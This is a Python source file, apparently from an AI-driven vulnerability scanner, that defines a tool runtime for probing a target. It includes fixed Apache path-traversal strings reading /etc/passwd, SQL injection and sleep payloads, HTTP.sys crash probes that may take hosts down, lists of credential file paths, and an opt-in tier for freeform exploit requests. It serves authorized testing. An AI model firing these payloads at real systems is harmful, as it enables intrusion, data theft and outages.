"""ToolRuntime — deterministic execution of AI-selected investigation tools."""
from __future__ import annotations

import logging
import time
from dataclasses import dataclass, field
from typing import Any, Callable

from src.reasoning.agent import sanitize as san

log = logging.getLogger("netlogic.reasoning.agent.tools")


@dataclass
class ToolResult:
    ok: bool
    observation_id: str
    tool: str
    summary: str
    data: dict = field(default_factory=dict)
    error: str = ""
    network: bool = False  # counts against request budget

    def to_dict(self) -> dict:
        return {
            "ok": self.ok, "observation_id": self.observation_id, "tool": self.tool,
            "summary": self.summary, "data": self.data, "error": self.error,
            "network": self.network,
        }


# ── Read-only policy ─────────────────────────────────────────────────────────
# Agent tools MUST NOT create, update, or delete application/content data.
# Network I/O is limited to discovery/read probes (GET/HEAD/OPTIONS, UDP query,
# TLS handshake, passive DNS). Session cookies are applied only on the scanner
# side for subsequent reads — we never write resources on the target.

# Built-in path lists for dir_enum (GET only). Small + intentional — not nuclei.
_DIR_LISTS: dict[str, tuple[str, ...]] = {
    "short": (
        "/", "/robots.txt", "/sitemap.xml", "/favicon.ico",
        "/.well-known/security.txt", "/api", "/api/health", "/health",
        "/admin", "/login", "/.env", "/.git/config",
    ),
    "common": (
        "/", "/robots.txt", "/sitemap.xml", "/favicon.ico", "/crossdomain.xml",
        "/.well-known/security.txt", "/.well-known/assetlinks.json",
        "/api", "/api/", "/api/v1", "/api/v1/health", "/api/v1/status", "/api/health",
        "/api/status", "/api/version", "/health", "/healthz", "/ready", "/status",
        "/admin", "/administrator", "/login", "/signin", "/auth", "/oauth",
        "/dashboard", "/console", "/wp-admin", "/wp-login.php", "/graphql",
        "/swagger", "/swagger.json", "/openapi.json", "/docs", "/redoc",
        "/.env", "/.env.local", "/.env.production", "/.git/config", "/.git/HEAD",
        "/.svn/entries", "/backup", "/backup.zip", "/dump.sql", "/phpinfo.php",
        "/server-status", "/server-info", "/actuator", "/actuator/health",
        "/.vercel/project.json", "/_next/static/chunks/main.js",
        "/config.json", "/app.config.json", "/manifest.json",
    ),
    "api": (
        "/api", "/api/v1", "/api/v2", "/api/v1/users", "/api/v1/user", "/api/v1/me",
        "/api/v1/config", "/api/v1/health", "/api/v1/status", "/api/auth/session",
        "/api/auth/csrf", "/api/auth/providers", "/api/auth/signin", "/api/auth/callback",
        "/api/graphql", "/graphql", "/gql", "/rest", "/rest/v1",
        "/v1", "/v1/health", "/internal", "/internal/health", "/debug", "/metrics",
    ),
    "config": (
        "/.env", "/.env.local", "/.env.production", "/.env.development",
        "/.git/config", "/.git/HEAD", "/.svn/entries", "/web.config",
        "/config.php", "/config.json", "/settings.json", "/appsettings.json",
        "/application.properties", "/.aws/credentials", "/wp-config.php",
        "/.htaccess", "/.htpasswd", "/composer.json", "/package.json",
    ),
    "admin": (
        "/admin", "/admin/", "/administrator", "/login", "/signin", "/wp-admin",
        "/wp-login.php", "/user/login", "/accounts/login", "/dashboard",
        "/console", "/manage", "/manager", "/backend", "/cpanel", "/phpmyadmin",
        "/adminer", "/nexus", "/jenkins", "/grafana",
    ),
}

_SSDP_MSEARCH = (
    "M-SEARCH * HTTP/1.1\r\n"
    "HOST: 239.255.255.250:1900\r\n"
    'MAN: "ssdp:discover"\r\n'
    "MX: 2\r\n"
    "ST: ssdp:all\r\n"
    "\r\n"
).encode("ascii")

# ── Tier A: curated POST body templates (never free-form model bodies) ───────
_HTTP_BODY_TEMPLATES: dict[str, dict] = {
    "json_empty": {
        "method": "POST",
        "content_type": "application/json",
        "body": "{}",
        "note": "empty JSON object probe",
    },
    "form_login_probe": {
        "method": "POST",
        "content_type": "application/x-www-form-urlencoded",
        "body": "username=netlogic_probe&password=netlogic_probe",
        "note": "benign fake login credentials — observe status only",
    },
    "json_login_probe": {
        "method": "POST",
        "content_type": "application/json",
        "body": '{"username":"netlogic_probe","password":"netlogic_probe"}',
        "note": "benign JSON login probe",
    },
    "graphql_ping": {
        "method": "POST",
        "content_type": "application/json",
        "body": '{"query":"{ __typename }"}',
        "note": "minimal GraphQL typename probe",
    },
}

# Fixed GraphQL introspection (schema leak discovery only).
_GRAPHQL_INTROSPECTION = (
    '{"query":"query IntrospectionQuery { __schema { queryType { name } '
    'mutationType { name } types { name kind } } }"}'
)

# Marker used in reflection / redirect probes (unique enough to detect bounce).
_REFLECT_MARKER = "nlprobe7f3a9c2e"

# Auth-flow candidate paths (GET only; cookies captured scanner-side).
_AUTH_PATHS = (
    "/login", "/signin", "/sign-in", "/auth/login", "/user/login",
    "/accounts/login", "/wp-login.php", "/admin/login", "/oauth/authorize",
)

# Common API / OpenAPI discovery paths for api_discover.
_API_DISCOVER_PATHS = (
    "/robots.txt", "/sitemap.xml", "/.well-known/security.txt",
    "/openapi.json", "/openapi.yaml", "/swagger.json", "/swagger/v1/swagger.json",
    "/api-docs", "/api/swagger.json", "/v1/openapi.json", "/graphql",
    "/.well-known/openid-configuration", "/manifest.json",
)

# Storage host suffixes we flag when seen in HTML/JS (report only unless HEAD same-host).
_STORAGE_HOST_RE = (
    r"(?:[\w.-]+\.s3[\w.-]*\.amazonaws\.com|"
    r"[\w.-]+\.blob\.core\.windows\.net|"
    r"storage\.googleapis\.com|"
    r"[\w.-]+\.r2\.cloudflarestorage\.com)"
)

# Curated crash/DoS-class probes — never freeform AI-invented kernel crashes.
# Only available when allow_crash_probes=True. Still non-write, but may disrupt host.
_CRASH_PROBES: dict[str, dict] = {
    "cve-2021-31166": {
        "description": "HTTP.sys UAF via crafted Accept-Encoding (may BSOD unpatched hosts)",
        "method": "GET",
        "path": "/",
        "headers": {
            # Public research pattern; destructive on vulnerable http.sys
            "Accept-Encoding": "doar-e, f, asdf, gzip, deflate",
        },
        "signals": ("timeout", "reset", "connection aborted", "forcibly closed"),
    },
    "cve-2022-21907": {
        "description": "HTTP Protocol Stack RCE/DoS via crafted URL trail (may crash unpatched)",
        "method": "GET",
        "path": "/{trailing}",  # expanded to path with trailing data
        "headers": {},
        "signals": ("timeout", "reset", "connection aborted", "forcibly closed"),
        "path_override": "/" + ("A" * 100) + "/",
    },
    "cve-2015-1635": {
        "description": "MS15-034 HTTP.sys Range header (may BSOD unpatched IIS ≤8.5)",
        "method": "GET",
        "path": "/",
        "headers": {"Range": "bytes=0-18446744073709551615"},
        "signals": ("timeout", "reset", "requested range not satisfiable", "416"),
    },
}

# ── Tier B: curated confirmation probes (NOT free-form exploits) ─────────────
# Safe CVE probes: fixed paths/headers; confirm via response markers only.
_CVE_SAFE_PROBES: dict[str, dict] = {
    "cve-2021-41773": {
        "description": "Apache 2.4.49 path traversal (safe file-read probe)",
        "paths": (
            "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        ),
        "body_markers": ("root:x:", "root:.*:0:0", "daemon:x:"),
    },
    "cve-2021-42013": {
        "description": "Apache 2.4.50 path traversal (safe file-read probe)",
        "paths": (
            "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
            "/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
        ),
        "body_markers": ("root:x:", "daemon:x:"),
    },
    "cve-2017-7529": {
        "description": "nginx range filter integer overflow (observe multipart / large range)",
        "paths": ("/",),
        "headers": {"Range": "bytes=-9223372036854775808,-9223372036854775807"},
        "body_markers": ("Content-Range", "multipart/byteranges"),
        "header_markers": ("content-range", "multipart/byteranges"),
    },
    "wp-users-rest": {
        "description": "WordPress users REST enumeration (unauthenticated)",
        "paths": ("/wp-json/wp/v2/users", "/?rest_route=/wp/v2/users"),
        "body_markers": ('"slug":', '"name":', '"id":'),
    },
    "spring-actuator-env": {
        "description": "Spring Boot actuator env exposure",
        "paths": ("/actuator/env", "/env", "/actuator/health"),
        "body_markers": ("propertySources", "systemProperties", "server.port", '"status":"UP"'),
    },
    "cve-2018-15473-hint": {
        "description": "OpenSSH user-enum class — use ssh_banner_timing; this only notes SSH banner",
        "paths": (),  # handled specially via raw TCP banner
        "ssh_banner": True,
        "banner_markers": ("SSH-2.0-OpenSSH",),
    },
}

# Fixed SQLi payloads (boolean / time) — never model-authored SQL.
_SQLI_BOOLEAN = {
    "baseline": "1",
    "true": ("1' OR '1'='1", "1 OR 1=1", "1') OR ('1'='1"),
    "false": ("1' OR '1'='2", "1 OR 1=2", "1') OR ('1'='2"),
}
_SQLI_TIME = (
    # short sleeps only (3s) — differential vs baseline
    "1' AND SLEEP(3)--",
    "1;SELECT SLEEP(3)--",
    "1' AND pg_sleep(3)--",
    "1 WAITFOR DELAY '0:0:3'--",
)

# Sensitive file paths + content markers (file_disclosure).
_FILE_DISCLOSURE: tuple[tuple[str, tuple[str, ...]], ...] = (
    ("/.env", ("APP_KEY=", "DB_PASSWORD=", "SECRET_KEY=", "AWS_SECRET", "MYSQL_")),
    ("/.env.local", ("APP_KEY=", "DB_PASSWORD=", "SECRET")),
    ("/.env.production", ("APP_KEY=", "DB_PASSWORD=", "SECRET")),
    ("/.git/HEAD", ("ref: refs/",)),
    ("/.git/config", ("[core]", "[remote", "url =")),
    ("/web.config", ("<configuration", "connectionString", "<appSettings")),
    ("/wp-config.php", ("DB_NAME", "DB_PASSWORD", "table_prefix")),
    ("/config.php", ("password", "db_pass", "DB_PASSWORD")),
    ("/application.properties", ("spring.datasource", "password=")),
    ("/appsettings.json", ("ConnectionStrings", "Password")),
    ("/server-status", ("Apache Server Status", "Server Version")),
    ("/server-info", ("Apache Server Information",)),
    ("/phpinfo.php", ("phpinfo()", "PHP Version")),
    ("/actuator/env", ("propertySources", "systemProperties")),
    ("/.aws/credentials", ("[default]", "aws_secret_access_key")),
    ("/backup.sql", ("CREATE TABLE", "INSERT INTO")),
    ("/dump.sql", ("CREATE TABLE", "INSERT INTO")),
    ("/crossdomain.xml", ("<cross-domain-policy", "allow-access-from")),
)


class ToolRuntime:
    """Validates and executes tool calls. AI proposes; this class alone touches the network."""

    def __init__(
        self,
        *,
        host: str,
        port: int = 80,
        tls: bool = False,
        scope: list[str] | None = None,
        allow_crash_probes: bool = False,
        allow_freeform_proof: bool = False,
        allow_exploit_requests: bool = False,
        http_fn: Callable | None = None,
        obs_counter_start: int = 0,
    ) -> None:
        self.host = host
        self.port = port
        self.tls = tls
        self.scope = list(scope or [host])
        self.allow_crash_probes = allow_crash_probes
        # Tier C: freeform GET/HEAD/OPTIONS (+ allowlisted POST) proof payloads.
        # Still fail-closed on destructive patterns — never write/delete app data.
        self.allow_freeform_proof = bool(allow_freeform_proof)
        # Tier E (opt-in, owned/in-scope targets only): freeform EXPLOIT requests — ANY method +
        # arbitrary path/headers/body against the SCOPE-GATED target, audited. Still fail-closed on
        # mass-destructive patterns and CR/LF header injection. Off by default.
        self.allow_exploit_requests = bool(allow_exploit_requests)
        self._http_fn = http_fn  # injectable (tests)
        self._n = obs_counter_start
        self.findings: list[dict] = []
        self.chains: list[dict] = []
        self.observations: list[dict] = []
        # Tier D: operator-facing PoCs + last readiness snapshot
        self.pocs: list[dict] = []
        self.readiness: dict | None = None
        # Scanner-side session only (Cookie / Authorization on outbound reads).
        self._session_cookies: dict[str, str] = {}
        self._session_headers: dict[str, str] = {}

    def _oid(self) -> str:
        self._n += 1
        return f"obs_{self._n}"

    def catalog(self) -> list[dict]:
        tools = [
            {"name": "http_request", "risk": "safe_active",
             "args": "method(GET|HEAD|OPTIONS)|body_template("
                     + "|".join(sorted(_HTTP_BODY_TEMPLATES))
                     + "),path,headers?,port?,tls?,timeout? — free-form POST body forbidden"},
            {"name": "param_reflect", "risk": "safe_active",
             "args": "path?,param?(default q),port?,tls? — reflection / open-redirect marker"},
            {"name": "cors_probe", "risk": "safe_active",
             "args": "path?,origin?(default https://evil.example),port?,tls?"},
            {"name": "header_injection_probe", "risk": "safe_active",
             "args": "path?,port?,tls? — Host/X-Forwarded-* observation only"},
            {"name": "auth_flow_probe", "risk": "safe_active",
             "args": "path?(optional login path),port?,tls? — GET login surface; capture Set-Cookie"},
            {"name": "jwt_inspect", "risk": "none",
             "args": "token? | from_cookie? — decode JWT header/claims (no crypto verify)"},
            {"name": "graphql_introspect", "risk": "safe_active",
             "args": "path?(default /graphql),port?,tls? — fixed introspection query only"},
            {"name": "api_discover", "risk": "safe_active",
             "args": "port?,tls? — robots/OpenAPI/common API doc paths"},
            {"name": "s3_or_storage_probe", "risk": "safe_active",
             "args": "path?(default /),port?,tls? — find storage URLs in page/JS"},
            {"name": "subdomain_probe", "risk": "read_only",
             "args": "labels?[] — DNS resolve labels under scope parent only"},
            {"name": "ssh_banner_timing", "risk": "safe_active",
             "args": "port?(22),samples? — SSH banner + connect timing samples"},
            {"name": "ssl_cert_chain", "risk": "read_only",
             "args": "port?(443) — leaf cert + chain subject/issuer/SAN/expiry"},
            # Tier B
            {"name": "cve_probe", "risk": "safe_active",
             "args": f"cve_id one of {sorted(_CVE_SAFE_PROBES)} — non-crash marker probes only"},
            {"name": "sqli_boolean", "risk": "safe_active",
             "args": "path,param?(id),port?,tls? — fixed boolean payload differential"},
            {"name": "sqli_time", "risk": "safe_active",
             "args": "path,param?(id),port?,tls? — fixed 3s sleep differential (may be slow)"},
            {"name": "ssrf_canary", "risk": "safe_active",
             "args": "canary_host (required),path?,param?(url),port?,tls? — inject http://canary into param"},
            {"name": "idor_diff", "risk": "safe_active",
             "args": "path, cookies_a{}, cookies_b{},port?,tls? — compare two sessions same object"},
            {"name": "file_disclosure", "risk": "safe_active",
             "args": "port?,tls?,max_paths? — fixed sensitive paths + content markers"},
            {"name": "smuggling_desync", "risk": "intrusive",
             "args": "path? — CL.TE observation only; requires allow_crash_probes (proxy risk)"},
            # Tier D — report / HackerOne bookkeeping (no network or low-risk)
            {"name": "record_poc", "risk": "none",
             "args": "observation_id?,finding_id?,title?,notes? — build curl PoC from obs"},
            {"name": "scope_check", "risk": "none",
             "args": "host?,path? — is asset in scan scope?"},
            {"name": "severity_suggest", "risk": "none",
             "args": "finding_id? | class? | title? — H1-aligned severity rubric"},
            {"name": "submit_readiness", "risk": "none",
             "args": "finding_id? — score whether finding is H1-submit-ready"},
            {"name": "raw_tcp", "risk": "safe_active", "args": "payload (str|bytes),port?,timeout?"},
            {"name": "udp_probe", "risk": "safe_active",
             "args": "port,payload? (str|bytes),timeout? — READ-ONLY UDP query"},
            {"name": "ssdp_discover", "risk": "safe_active",
             "args": "port? (default 1900),timeout? — M-SEARCH discovery only"},
            {"name": "tls_inspect", "risk": "read_only", "args": "port?"},
            {"name": "dns_lookup", "risk": "read_only", "args": "(none — uses target host)"},
            {"name": "confirm_tech", "risk": "safe_active", "args": "tech (iis|nginx|express|…)"},
            {"name": "timing_probe", "risk": "safe_active",
             "args": "path_a,path_b?,headers_a?,headers_b? — GET timing only"},
            {"name": "dir_enum", "risk": "safe_active",
             "args": "wordlist(common|api|config|admin|short)?,max_paths?,port?,tls? — GET only"},
            {"name": "set_session", "risk": "none",
             "args": "cookies?{},headers?{} — scanner-side auth for subsequent READs only"},
            {"name": "clear_session", "risk": "none", "args": "(none)"},
            {"name": "browser_get", "risk": "safe_active",
             "args": "path?,port?,tls?,timeout?,wait_ms? — headless GET; may pass JS challenges; READ-ONLY"},
            {"name": "assert_finding", "risk": "none",
             "args": "id,title,severity,status(confirmed|lead),evidence_refs[],rationale?"},
            {"name": "chain_link", "risk": "none", "args": "from,to,why"},
            {"name": "stop", "risk": "none", "args": "summary?"},
        ]
        if self.allow_crash_probes:
            tools.append({
                "name": "crash_probe", "risk": "intrusive",
                "args": f"cve_id one of {sorted(_CRASH_PROBES)} — MAY crash target (still non-write)",
            })
        if self.allow_freeform_proof:
            tools.append({
                "name": "http_proof", "risk": "safe_active",
                "args": (
                    "method(GET|HEAD|OPTIONS|POST),path,headers?,body?,port?,tls?,timeout?,expect_marker? "
                    "— Tier C freeform proof ONLY (opt-in). POST limited to search/login/graphql-like "
                    "paths. Destructive patterns (DROP/DELETE FROM/rm -rf/…) always blocked. "
                    "Never PUT/PATCH/DELETE. Goal: expose a vuln signal, not mutate target data."
                ),
            })
        if self.allow_exploit_requests:
            tools.append({
                "name": "exploit_request", "risk": "exploit",
                "args": (
                    "method(GET|HEAD|POST|PUT|PATCH|DELETE|OPTIONS),path,headers?,body?,port?,tls?,"
                    "timeout?,expect_marker? — Tier E FREEFORM EXPLOIT (opt-in, AUTHORIZED/owned "
                    "in-scope target ONLY). Any method + arbitrary path/headers/body. Still blocks "
                    "mass-destructive patterns (DROP/TRUNCATE TABLE, rm -rf, …) and CR/LF header "
                    "injection. Scope-gated + audited. Use to actively exploit/verify on YOUR target."
                ),
            })
        return tools

    def execute(self, tool: str, args: dict | None) -> ToolResult:
        args = args if isinstance(args, dict) else {}
        name = str(tool or "").strip().lower()
        try:
            dispatch = {
                "http_request": self._http_request,
                "param_reflect": self._param_reflect,
                "cors_probe": self._cors_probe,
                "header_injection_probe": self._header_injection_probe,
                "auth_flow_probe": self._auth_flow_probe,
                "jwt_inspect": self._jwt_inspect,
                "graphql_introspect": self._graphql_introspect,
                "api_discover": self._api_discover,
                "s3_or_storage_probe": self._s3_or_storage_probe,
                "subdomain_probe": self._subdomain_probe,
                "ssh_banner_timing": self._ssh_banner_timing,
                "ssl_cert_chain": self._ssl_cert_chain,
                "cve_probe": self._cve_probe,
                "sqli_boolean": self._sqli_boolean,
                "sqli_time": self._sqli_time,
                "ssrf_canary": self._ssrf_canary,
                "idor_diff": self._idor_diff,
                "file_disclosure": self._file_disclosure,
                "smuggling_desync": self._smuggling_desync,
                "http_proof": self._http_proof,
                "exploit_request": self._exploit_request,
                "record_poc": self._record_poc,
                "scope_check": self._scope_check,
                "severity_suggest": self._severity_suggest,
                "submit_readiness": self._submit_readiness,
                "raw_tcp": self._raw_tcp,
                "udp_probe": self._udp_probe,
                "ssdp_discover": self._ssdp_discover,
                "tls_inspect": self._tls_inspect,
                "dns_lookup": self._dns_lookup,
                "confirm_tech": self._confirm_tech,
                "timing_probe": self._timing_probe,
                "dir_enum": self._dir_enum,
                "set_session": self._set_session,
                "clear_session": self._clear_session,
                "browser_get": self._browser_get,
                "assert_finding": self._assert_finding,
                "chain_link": self._chain_link,
                "crash_probe": self._crash_probe,
            }
            if name == "stop":
                oid = self._oid()
                return ToolResult(True, oid, "stop", str(args.get("summary") or "stop"),
                                  data={"stop": True}, network=False)
            fn = dispatch.get(name)
            if fn is None:
                oid = self._oid()
                return ToolResult(False, oid, name, "unknown tool", error="unknown tool")
            return fn(args)
        except Exception as exc:  # noqa: BLE001
            oid = self._oid()
            log.debug("tool %s failed: %s", name, exc)
            return ToolResult(False, oid, name, f"error: {exc}", error=str(exc)[:200])

    # ── Network helpers ──────────────────────────────────────────────────────

    def _merge_headers(self, headers: dict | None) -> dict[str, str]:
        """Outbound headers = session + per-call (session cannot be overridden by empty)."""
        out: dict[str, str] = dict(self._session_headers)
        if headers:
            out.update(headers)
        if self._session_cookies:
            cookie = "; ".join(f"{k}={v}" for k, v in self._session_cookies.items())
            # Append to any explicit Cookie
            existing = out.get("Cookie") or out.get("cookie") or ""
            out["Cookie"] = f"{existing}; {cookie}".strip("; ") if existing else cookie
        return out

    def _do_http(self, method: str, path: str, headers: dict, body: str | None,
                 port: int, tls: bool, timeout: float, *, allow_post: bool = False,
                 allow_any_method: bool = False) -> dict:
        # Default: GET/HEAD/OPTIONS only. Curated POST allowed only when allow_post=True
        # and body is an engine template (never free-form model payloads).
        method = (method or "GET").upper()
        if allow_any_method:
            # Freeform exploit request (opt-in, scope-gated, already destructive-filtered by the
            # caller): honor any method and keep the (bounded) body — incl. PUT/PATCH/DELETE.
            if body is not None:
                body = str(body)[:65_536]
        elif method in ("GET", "HEAD", "OPTIONS"):
            body = None
        elif method == "POST" and allow_post and body is not None:
            body = str(body)[:4096]
        else:
            return {"error": "method not allowed (read-only)", "elapsed_ms": 0,
                    "status": None, "headers": {}, "body": ""}
        headers = self._merge_headers(headers or {})
        if self._http_fn is not None:
            return self._http_fn(method, path, headers, body, port, tls, timeout)
        from src.verifier.runner import (  # noqa: PLC0415
            _build_http_request, _parse_http_response, _tcp_send_recv,
        )
        payload = _build_http_request(method, path, self.host, headers, body)
        raw, elapsed, err = _tcp_send_recv(self.host, port, payload, timeout=timeout, use_tls=tls)
        if err:
            return {"error": err, "elapsed_ms": elapsed, "status": None, "headers": {}, "body": ""}
        if raw is None:
            return {"error": "no response", "elapsed_ms": elapsed, "status": None,
                    "headers": {}, "body": ""}
        status, resp_headers, resp_body = _parse_http_response(raw)
        return {
            "error": "", "elapsed_ms": elapsed, "status": status,
            "headers": dict(resp_headers), "body": (resp_body or "")[:2000],
        }

    def _http_request(self, args: dict) -> ToolResult:
        oid = self._oid()
        path = san.safe_path(args.get("path") or "/")
        headers = san.safe_headers(args.get("headers"))
        if path is None or headers is None:
            return ToolResult(False, oid, "http_request", "invalid path/headers",
                              error="sanitize failed", network=False)
        port = san.safe_port(args.get("port"), self.port)
        tls = bool(args.get("tls", self.tls))
        timeout = san.safe_timeout(args.get("timeout"), 5.0)

        # Curated POST via body_template only — free-form body is ignored/rejected.
        template_name = str(args.get("body_template") or args.get("template") or "").strip().lower()
        body = None
        allow_post = False
        if template_name:
            tpl = _HTTP_BODY_TEMPLATES.get(template_name)
            if tpl is None:
                return ToolResult(
                    False, oid, "http_request",
                    f"unknown body_template (allowed: {sorted(_HTTP_BODY_TEMPLATES)})",
                    error="unknown template", network=False,
                )
            method = tpl["method"]
            body = tpl["body"]
            headers = dict(headers)
            headers.setdefault("Content-Type", tpl["content_type"])
            allow_post = True
        else:
            method = san.safe_method(args.get("method") or "GET") or "GET"
            # Explicit free-form body is rejected (do not silently strip into a write).
            if args.get("body") not in (None, ""):
                return ToolResult(
                    False, oid, "http_request",
                    "free-form body forbidden — use body_template="
                    + "|".join(sorted(_HTTP_BODY_TEMPLATES)),
                    error="free-form body forbidden", network=False,
                )

        resp = self._do_http(method, path, headers, body, port, tls, timeout,
                             allow_post=allow_post)
        if resp.get("error"):
            tr = ToolResult(False, oid, "http_request",
                            f"{method} {path} → {resp['error']}",
                            data={**resp, "body_template": template_name or None},
                            error=str(resp["error"]), network=True)
        else:
            tr = ToolResult(True, oid, "http_request",
                            f"{method} {path} → HTTP {resp.get('status')}"
                            + (f" [template={template_name}]" if template_name else ""),
                            data={**resp, "body_template": template_name or None}, network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _http_proof(self, args: dict) -> ToolResult:
        """Tier C freeform proof request — opt-in, fail-closed on destructive content.

        Proves vulnerabilities via crafted path/query/headers/(allowlisted) body without
        write/delete methods. Requires ``allow_freeform_proof=True``.
        """
        oid = self._oid()
        if not self.allow_freeform_proof:
            return ToolResult(
                False, oid, "http_proof",
                "http_proof disabled — set allow_freeform_proof (Tier C opt-in)",
                error="freeform proof not authorized", network=False,
            )

        method = san.safe_proof_method(args.get("method") or "GET")
        if method is None:
            return ToolResult(
                False, oid, "http_proof",
                "method not allowed — use GET|HEAD|OPTIONS or POST on allowlisted paths "
                "(PUT/PATCH/DELETE permanently forbidden)",
                error="method not allowed", network=False,
            )

        path = san.safe_path(args.get("path") or "/")
        headers = san.safe_headers(args.get("headers"))
        if path is None or headers is None:
            return ToolResult(False, oid, "http_proof", "invalid path/headers",
                              error="sanitize failed", network=False)

        body: str | None = None
        allow_post = False
        if method == "POST":
            if not san.is_proof_post_path_allowed(path):
                return ToolResult(
                    False, oid, "http_proof",
                    f"POST path not allowlisted for freeform proof: {path[:80]!r} "
                    "(allowed: search/query/login/auth/graphql/echo-like surfaces only)",
                    error="post path not allowlisted", network=False,
                )
            body = san.safe_proof_body(args.get("body"))
            if body is None and args.get("body") not in (None, ""):
                return ToolResult(False, oid, "http_proof", "invalid body",
                                  error="sanitize failed", network=False)
            if body is None:
                body = ""
            allow_post = True
            # Default content-type for JSON-ish bodies
            if "Content-Type" not in headers and "content-type" not in {k.lower() for k in headers}:
                bstrip = body.lstrip()
                if bstrip.startswith("{") or bstrip.startswith("["):
                    headers = dict(headers)
                    headers["Content-Type"] = "application/json"
                elif "=" in body and not bstrip.startswith("<"):
                    headers = dict(headers)
                    headers["Content-Type"] = "application/x-www-form-urlencoded"
        else:
            # GET/HEAD/OPTIONS — ignore any body
            body = None
            if args.get("body") not in (None, ""):
                # Don't send body on GET; warn but still allow the request without body
                pass

        # Fail closed on destructive patterns in path, headers, body
        hdr_blob = "\n".join(f"{k}: {v}" for k, v in (headers or {}).items())
        bad, reason = san.is_destructive_payload(path, hdr_blob, body or "")
        if bad:
            return ToolResult(
                False, oid, "http_proof",
                f"blocked: {reason}",
                error=reason, network=False,
                data={"blocked": True, "reason": reason, "method": method, "path": path},
            )

        port = san.safe_port(args.get("port"), self.port)
        tls = bool(args.get("tls", self.tls))
        timeout = san.safe_timeout(args.get("timeout"), 5.0)
        expect_marker = str(args.get("expect_marker") or args.get("marker") or "").strip()[:120]

        resp = self._do_http(method, path, headers, body, port, tls, timeout,
                             allow_post=allow_post)
        status = resp.get("status")
        rbody = str(resp.get("body") or "")
        rh = {str(k).lower(): str(v) for k, v in (resp.get("headers") or {}).items()}
        loc = rh.get("location") or ""

        signals: list[str] = []
        # Marker "in Location" only counts as open-redirect-ish if Location HOST is external.
        # Same-site bounce that echoes the marker in a query string is NOT a vuln signal.
        try:
            from src.vuln_prober import (  # noqa: PLC0415
                location_is_external, parse_location_host, hosts_same_site,
            )
        except Exception:  # noqa: BLE001
            location_is_external = None  # type: ignore
            parse_location_host = None  # type: ignore
            hosts_same_site = None  # type: ignore

        loc_host = ""
        if loc and parse_location_host:
            try:
                loc_host = parse_location_host(loc) or ""
            except Exception:  # noqa: BLE001
                loc_host = ""

        if expect_marker:
            in_body = expect_marker in rbody
            in_other_hdrs = any(
                expect_marker in str(v)
                for k, v in rh.items() if str(k).lower() != "location"
            )
            marker_in_loc = expect_marker in loc
            if in_body or in_other_hdrs:
                signals.append("expect_marker_reflected")
            if marker_in_loc:
                if location_is_external and location_is_external(loc, self.host):
                    signals.append("expect_marker_in_external_location")
                else:
                    signals.append("marker_echoed_in_same_site_location_query")
        # Generic proof heuristics (non-authoritative — agent decides)
        if status and int(status) >= 500:
            signals.append("server_error")
        if "sql" in rbody.lower() and ("syntax" in rbody.lower() or "mysql" in rbody.lower()
                                       or "postgresql" in rbody.lower() or "odbc" in rbody.lower()):
            signals.append("sql_error_leak")
        if any(x in rbody.lower() for x in ("stack trace", "traceback", "exception in",
                                            "at com.", "at org.")):
            signals.append("stack_trace_leak")
        if loc and location_is_external and location_is_external(loc, self.host):
            signals.append("external_redirect")
        elif loc and loc_host and hosts_same_site and hosts_same_site(loc_host, self.host):
            signals.append("same_site_redirect")

        # Only high-signal classes count as vulnerable_signal (not same-site echo)
        vuln_classes = {
            "expect_marker_reflected", "expect_marker_in_external_location",
            "external_redirect", "server_error", "sql_error_leak", "stack_trace_leak",
        }
        vulnerable = bool(vuln_classes.intersection(signals))

        data = {
            **resp,
            "method": method,
            "path": path,
            "proof_mode": True,
            "body_sent": (body[:200] if body else None),
            "expect_marker": expect_marker or None,
            "location": loc[:300] if loc else "",
            "location_host": loc_host or None,
            "proof_signals": signals,
            "vulnerable_signal": vulnerable,
            # Operator-facing: quote OBSERVED Location so PoCs never invent evil.com redirects
            "observed_summary": (
                f"HTTP {status}"
                + (f"; Location: {loc[:200]}" if loc else "")
                + (f"; location_host={loc_host}" if loc_host else "")
            ),
        }
        if resp.get("error"):
            tr = ToolResult(
                False, oid, "http_proof",
                f"{method} {path} → {resp['error']}",
                data=data, error=str(resp["error"]), network=True,
            )
        else:
            sig = f" signals={signals}" if signals else ""
            tr = ToolResult(
                True, oid, "http_proof",
                f"PROOF {method} {path} → HTTP {status}{sig}",
                data=data, network=True,
            )
        self.observations.append(tr.to_dict())
        return tr

    def _exploit_request(self, args: dict) -> ToolResult:
        """Tier E freeform EXPLOIT request — opt-in (`allow_exploit_requests`), for AUTHORIZED
        engagements on owned/in-scope targets ONLY.

        Latitude: ANY HTTP method (incl. PUT/PATCH/DELETE) + arbitrary path/headers/body against the
        scope-gated target. Rails kept: (1) fail-closed on mass-destructive patterns
        (`is_destructive_payload`), (2) CR/LF/NUL header injection refused (`safe_exploit_headers`) so
        the request can't split/smuggle out of scope, (3) the executor still only ever prefixes the
        in-scope host:port. Every request is recorded as an observation (audit).
        """
        oid = self._oid()
        if not self.allow_exploit_requests:
            return ToolResult(
                False, oid, "exploit_request",
                "exploit_request disabled — set allow_exploit_requests (opt-in; owned/authorized "
                "in-scope targets only)",
                error="exploit requests not authorized", network=False,
            )
        method = san.safe_exploit_method(args.get("method") or "GET")
        if method is None:
            return ToolResult(False, oid, "exploit_request", "invalid HTTP method",
                              error="method not allowed", network=False)
        path = san.safe_path(args.get("path") or "/")
        headers = san.safe_exploit_headers(args.get("headers"))
        if path is None or headers is None:
            return ToolResult(
                False, oid, "exploit_request",
                "invalid path or headers (absolute URL, control chars, or CR/LF injection)",
                error="sanitize failed", network=False)
        body = san.safe_exploit_body(args.get("body"))

        # Rail 1: fail closed on mass-destructive patterns in path/headers/body.
        hdr_blob = "\n".join(f"{k}: {v}" for k, v in (headers or {}).items())
        bad, reason = san.is_destructive_payload(path, hdr_blob, body or "")
        if bad:
            return ToolResult(
                False, oid, "exploit_request", f"blocked: {reason}",
                error=reason, network=False,
                data={"blocked": True, "reason": reason, "method": method, "path": path})

        port = san.safe_port(args.get("port"), self.port)
        tls = bool(args.get("tls", self.tls))
        timeout = san.safe_timeout(args.get("timeout"), 8.0)
        expect_marker = str(args.get("expect_marker") or args.get("marker") or "").strip()[:120]

        resp = self._do_http(method, path, headers, body, port, tls, timeout, allow_any_method=True)
